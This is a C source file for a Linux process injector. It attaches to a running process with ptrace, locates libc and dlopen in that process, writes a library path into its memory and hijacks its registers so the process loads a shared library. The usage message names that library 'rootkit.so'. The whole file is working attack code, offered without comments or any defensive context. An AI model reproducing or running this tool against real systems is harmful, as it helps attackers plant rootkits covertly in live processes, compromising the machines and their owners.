#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <dlfcn.h>
#include <link.h>

static unsigned long get_libc_offset(const char *sym) {
    void *h = dlopen("libc.so.6", RTLD_LAZY | RTLD_NOLOAD);
    if (!h) return 0;
    void *addr = dlsym(h, sym);
    if (!addr) { dlclose(h); return 0; }

    Dl_info info;
    unsigned long sym_addr = (unsigned long)addr;
    unsigned long base = 0;
    if (dladdr(addr, &info)) {
        base = (unsigned long)info.dli_fbase;
    }
    dlclose(h);
    return sym_addr - base;
}

static unsigned long find_libc_base(pid_t pid) {
    char path[64], line[512];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) return 0;

    unsigned long base = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "libc.so") || strstr(line, "libc-")) {
            base = strtoul(line, NULL, 16);
            break;
        }
    }
    fclose(f);
    return base;
}

static int write_mem(pid_t pid, unsigned long addr, const void *buf, size_t len) {
    struct iovec local = { .iov_base = (void *)buf, .iov_len = len };
    struct iovec remote = { .iov_base = (void *)addr, .iov_len = len };
    ssize_t ret = process_vm_writev(pid, &local, 1, &remote, 1, 0);
    return (ret == (ssize_t)len) ? 0 : -1;
}

static unsigned long read_mem_ulong(pid_t pid, unsigned long addr) {
    unsigned long val = 0;
    struct iovec local = { .iov_base = &val, .iov_len = sizeof(val) };
    struct iovec remote = { .iov_base = (void *)addr, .iov_len = sizeof(val) };
    ssize_t ret = process_vm_readv(pid, &local, 1, &remote, 1, 0);
    return (ret == sizeof(val)) ? val : 0;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <rootkit.so>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    const char *so_path = argv[2];

    unsigned long target_libc = find_libc_base(pid);
    if (!target_libc) {
        fprintf(stderr, "[-] Could not find libc base in target\n");
        return 1;
    }

    unsigned long dlopen_off = get_libc_offset("dlopen");
    unsigned long dlsym_off = get_libc_offset("dlsym");
    if (!dlopen_off || !dlsym_off) {
        fprintf(stderr, "[-] Could not find dlopen/dlsym offset\n");
        return 1;
    }

    unsigned long target_dlopen = target_libc + dlopen_off;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("[-] ptrace attach");
        return 1;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct old_regs, regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &old_regs);
    memcpy(&regs, &old_regs, sizeof(regs));

    unsigned long mmap_addr = regs.rsp - 0x1000;
    mmap_addr &= ~0xfffull;

    if (write_mem(pid, mmap_addr, so_path, strlen(so_path) + 1) < 0) {
        perror("[-] write so_path");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    unsigned long gadget = regs.rsp - 8;
    unsigned long ret_addr = read_mem_ulong(pid, regs.rsp);
    if (write_mem(pid, gadget, &ret_addr, sizeof(ret_addr)) < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }

    regs.rdi = mmap_addr;
    regs.rsi = RTLD_NOW;
    regs.rdx = 0;
    regs.rsp = gadget;
    regs.rip = target_dlopen;

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    waitpid(pid, NULL, 0);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("[+] dlopen returned: 0x%lx\n", (unsigned long)regs.rax);

    ptrace(PTRACE_SETREGS, pid, NULL, &old_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    if (regs.rax) {
        printf("[+] Injected into PID %d\n", pid);
        return 0;
    }
    fprintf(stderr, "[-] Injection failed\n");
    return 1;
}
